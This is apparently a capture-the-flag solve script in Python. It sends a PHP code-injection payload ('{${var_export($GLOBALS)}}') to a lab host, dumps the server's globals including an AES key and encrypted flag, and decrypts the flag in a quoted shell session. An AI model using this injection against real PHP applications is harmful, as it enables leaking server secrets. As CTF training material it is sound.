#!/usr/bin/env python
import requests
import re

find_b64 = re.compile('Please decrypt the following ciphertext<br>\n<h1>([^<]*)</h1>')

s = requests.session()

url = 'http://catthna.nssa.ctf/cattnha.php'

'''
r = s.get(url)

for i in range(10000):
    decoded = find_b64.findall(r.text)[0].decode('base64')
    r = s.post(url, data={
        'captcha': decoded,
        })
    print (i, r.status_code, repr(r.text))
'''
r = s.get(url, params={'msg':'{${var_export($GLOBALS)}}'})
print(r.text)

'''
$ lynx -dump 'http://catthna.nssa.ctf/cattnha.php?msg={${var_export%28$GLOBALS%29}}'
Welcome to the first CATTNHA

   The first Completely Automated Test to Tell NSSA and Humans Apart
   To prove you are NSSA, you have to answer 10000 answers right.
   array ( '_GET' => array ( 'msg' => '{${var_export($GLOBALS)}}', ),
   '_POST' => array ( ), '_COOKIE' => array ( ), '_FILES' => array ( ),
   'GLOBALS' => NULL, 'key' =>
   'jhfNSE4Dlk66tchB0CaLbbSv3tT718kcmvJHdb6aRA4vQQSCmt2CmOVvA6jsoG7i997cVA
   xA97Aj3sCg6y070zx99u6j1JCD9IwQ2wq7uRw6KWWyWAjislcA1GckH90Z', 'method'
   => 'aes-256-cbc', 'ivlen' => 16, 'isCryptoStrong' => true, 'iv' =>
   6566567876567656, 'encrypted_flag' =>
   '8ompTcOpyWuIJNui+YRVAHQj2OzlruaPpJrBNGOA5PI=', '_SESSION' => array (
   'captcha_value' => '`>?sdNa2z', 'num_captcha' => 0, ), )
   Please decrypt the following ciphertext

W6r9RtA+iUbsUbPeT0xQ4zbpLkLT3f4TrPCuRebQx1I=

   Value ____________________
   Submit

   [1]source

References

   1. http://catthna.nssa.ctf/source.txt
$ php -a
php > echo openssl_decrypt(base64_decode('8ompTcOpyWuIJNui+YRVAHQj2OzlruaPpJrBNGOA5PI='), 'aes-256-cbc', 'jhfNSE4Dlk66tchB0CaLbbSv3tT718kcmvJHdb6aRA4vQQSCmt2CmOVvA6jsoG7i997cVAxA97Aj3sCg6y070zx99u6j1JCD9IwQ2wq7uRw6KWWyWAjislcA1GckH90Z', OPENSSL_RAW_DATA, 6566567876567656);
EvalMakesMeFeelSoiled
'''
